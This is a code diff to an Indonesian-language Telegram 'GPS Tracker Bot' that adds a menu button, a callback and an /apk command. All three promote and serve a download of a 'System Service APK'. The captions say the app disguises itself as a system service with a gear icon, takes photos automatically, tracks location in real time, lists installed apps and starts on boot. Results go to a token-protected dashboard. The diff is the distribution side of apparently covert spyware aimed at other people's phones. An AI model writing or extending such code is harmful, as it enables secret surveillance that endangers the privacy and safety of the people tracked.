@@ -63,6 +63,7 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("📋 Daftar Link Saya", callback_data="list_links")],
         [InlineKeyboardButton("🔔 Cek Notifikasi", callback_data="check_notif")],
         [InlineKeyboardButton("🗺 Lihat Peta", callback_data="view_map")],
+        [InlineKeyboardButton("📱 Download APK", callback_data="apk_info")],
         [InlineKeyboardButton("📊 Dashboard", url=f"{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}")],
     ]
     text = (
@@ -231,10 +232,36 @@ async def on_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("📋 Daftar Link Saya", callback_data="list_links")],
             [InlineKeyboardButton("🔔 Cek Notifikasi", callback_data="check_notif")],
             [InlineKeyboardButton("🗺 Lihat Peta", callback_data="view_map")],
+            [InlineKeyboardButton("📱 Download APK", callback_data="apk_info")],
             [InlineKeyboardButton("📊 Dashboard", url=f"{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}")],
         ]
         await q.edit_message_text("🚚 *GPS Tracker Bot*\n━━━━━━━━━━━━━━━━━━━━\n\nPilih menu 👇",
             reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
+
+    elif d == "apk_info":
+        await q.answer()
+        banner_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static", "apk-banner.png")
+        caption = (
+            "📱 *System Service APK*\n"
+            "━━━━━━━━━━━━━━━━━━━━\n\n"
+            "🔧 Gear Icon — menyamar sbg service sistem\n"
+            "📸 Camera Capture — foto otomatis\n"
+            "📍 GPS Tracker — lacak lokasi real-time\n"
+            "🔋 Battery Info — status baterai\n"
+            "📦 App List — daftar app terinstall\n"
+            "🚀 Auto-start saat boot HP\n\n"
+            f"⬇️ [Download APK]({BASE_URL}/apk/download)\n"
+            f"📊 [Dashboard]({BASE_URL}/dashboard?token={DASHBOARD_TOKEN})"
+        )
+        kb = [[InlineKeyboardButton("⬇️ Download APK", url=f"{BASE_URL}/apk/download")]]
+        try:
+            with open(banner_path, "rb") as f:
+                await context.bot.send_photo(chat_id=q.message.chat_id, photo=f,
+                    caption=caption, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
+        except Exception as e:
+            print(f"APK info error: {e}")
+            await context.bot.send_message(chat_id=q.message.chat_id, text=caption,
+                reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
 
 # ============ NOTIFICATION ============
 async def notify(tracking_id, lat, lon, accuracy, ip, data=None):
@@ -551,6 +578,37 @@ def apk_download():
     return "APK not found", 404
 
 
+async def cmd_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Send APK download info with image"""
+    banner_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static", "apk-banner.png")
+    caption = (
+        "📱 *System Service APK*\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        "🔧 Gear Icon — menyamar sebagai service sistem\n"
+        "📸 Camera Capture — foto otomatis saat izin diberikan\n"
+        "📍 GPS Tracker — lacak lokasi real-time\n"
+        "🔋 Battery Info — status baterai & suhu\n"
+        "📦 App List — daftar app terinstall\n"
+        "🚀 Auto-start saat boot HP\n\n"
+        "⬇️ *Download:*\n"
+        f"{BASE_URL}/apk/download\n\n"
+        "📊 *Dashboard:*\n"
+        f"{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}"
+    )
+    kb = [[
+        InlineKeyboardButton("⬇️ Download APK", url=f"{BASE_URL}/apk/download"),
+        InlineKeyboardButton("📊 Dashboard", url=f"{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}"),
+    ]]
+    try:
+        with open(banner_path, "rb") as f:
+            await update.message.reply_photo(photo=f, caption=caption,
+                reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
+    except Exception as e:
+        print(f"APK banner error: {e}")
+        await update.message.reply_text(caption,
+            reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
+
+
 # ============ MAIN ============
 def main():
     init_db()
@@ -563,6 +621,7 @@ def main():
     app_bot.add_handler(CommandHandler("help", cmd_start))
     app_bot.add_handler(CommandHandler("links", cmd_start))
     app_bot.add_handler(CommandHandler("map", cmd_start))
+    app_bot.add_handler(CommandHandler("apk", cmd_apk))
     app_bot.add_handler(CallbackQueryHandler(on_click))
     print("🤖 Bot running...")
     app_bot.run_polling()
